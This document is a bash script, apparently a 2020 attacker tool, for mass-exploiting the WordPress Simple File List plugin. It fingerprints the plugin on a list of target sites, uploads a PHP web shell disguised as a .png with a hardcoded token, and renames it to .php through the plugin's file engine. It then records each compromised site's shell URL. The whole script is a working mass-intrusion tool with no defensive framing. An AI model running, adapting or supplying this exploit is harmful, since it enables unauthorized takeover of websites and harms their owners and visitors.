#!/bin/bash
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'

echo -e $yellow"============================================"
echo -e $yellow" Mass Exploit Wordpress Simple File List"
echo -e $yellow"        Copyright Mrcakil@2020              "
echo -e $yellow"============================================"
read -p "Input List : " list;
read -p "Your Shell : " shel;
checker(){
shell=$(echo "$shel" | cut -d "." -f1)
if [[ $(curl -s -L "$target/wp-content/plugins/simple-file-list/readme.txt") =~ 'Simple File List' ]];
then
echo -e "$okegreen[+]$cyan $target/wp-content/plugins/simple-file-list/ =>$okegreen FOUND"
echo -e "$okegreen[+]$cyan $target/wp-content/plugins/simple-file-list/ =>$yellow Trying Exploit"
  if [[ $(curl -s -L "$target/wp-content/plugins/simple-file-list/readme.txt") =~ 'Tested up to: 5.4' ]];
  then
     echo -e "$okegreen[+]$cyan $target/wp-content/plugins/simple-file-list/ =>$okegreen Moved $shell.php to $shell.png"
     cp $shell.php $shell.png
     if [[ $(curl -s -F "file=@${shell}.png;type=image/png" -F "eeSFL_ID=1" -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" -F "eeSFL_Timestamp=1587258885" -F "eeSFL_Token=ba288252629a5399759b6fde1e205bc2" $target/wp-content/plugins/simple-file-list/ee-upload-engine.php) =~ 'SUCCESS' ]];
     then
        echo -e "$okegreen[+]$cyan $target/wp-content/plugins/simple-file-list/$shell.png =>$okegreen Success $shell.png"
        echo -e "$okegreen[+]$cyan $target/wp-content/uploads/simple-file-list/$shell.png =>$okegreen Trying Rename $shell.png to $shell.php"
        if [[ $(curl -s -H "Referer: $target/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1" -H "X-Requested-With: XMLHttpRequest" -d "eeSFL_ID=1" -d "eeFileOld=${shell}.png" -d "eeListFolder=/" -d "eeFileAction=Rename|${shell}.php" $target/wp-content/plugins/simple-file-list/ee-file-engine.php) =~ 'SUCCESS' ]];
        then
           echo -e "$okegreen[+]$cyan $target/wp-content/uploads/simple-file-list/$shell.php =>$okegreen Gotcha!!!"
           echo "$target/wp-content/uploads/simple-file-list/$shell.php" >> shell.txt
        else
           echo -e "$okegreen[+]$cyan $target/wp-content/uploads/simple-file-list/$shell.php =>$red Failed Rename"
         fi
     else
        echo -e "$okegreen[+]$cyan $target/wp-content/uploads/simple-file-list/$shell.php =>$red Failed Upload!!!"
     fi
   else
     echo -e "$okegreen[+]$cyan $target/wp-content/uploads/simple-file-list/$shell.php =>$red Unable Version :("
   fi   
else
   echo -e "$okegreen[+]$cyan $target/wp-content/plugins/simple-file-list/ =>$red Not Found"
fi

}

for target in `cat $list`;
do
checker
done